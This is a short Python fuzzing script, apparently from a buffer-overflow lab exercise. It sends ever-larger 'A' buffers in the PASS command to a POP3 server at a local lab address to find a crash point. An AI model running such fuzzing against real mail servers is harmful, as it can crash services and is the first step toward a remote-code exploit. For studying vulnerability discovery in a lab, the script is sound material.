import socket

buffer = [b'A']
contador = 100
while len(buffer) <= 25:
    buffer.append(b'A' * contador)
    contador = contador + 200

for string in buffer:
    print("Fuzzing PASS com %s bytes" % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.4", 110))
    s.recv(1024)
    s.send(b'USER teste\r\n')
    s.recv(1024)
    s.send(b'PASS ' + string + b'\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.close()
